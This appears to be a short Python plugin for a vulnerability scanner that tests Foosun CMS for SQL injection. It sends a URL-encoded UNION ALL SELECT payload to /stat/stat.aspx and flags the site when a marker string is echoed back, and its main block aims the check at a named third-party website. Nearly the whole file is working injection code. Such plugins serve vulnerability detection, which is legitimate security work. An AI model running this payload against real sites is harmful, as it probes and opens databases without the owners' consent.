#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author: range
#ref: http://www.wooyun.org/bugs/wooyun-2010-0117395

def assign(service, arg):
    if service == "foosun":
        return True, arg
        
def audit(arg):
    payload = "/stat/stat.aspx?statid=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,XINGGUANGDANIU,NULL,NULL--"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl2(url, user_agent="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X M    etaSr 1.0")
    if code == 200 and 'XINGGUANGDANIU' in res:
        security_hole(url + '   found sql injection!')

if __name__ == '__main__':
    from dummy import *
    audit(assign('foosun', 'http://www.luohe.tv/')[1])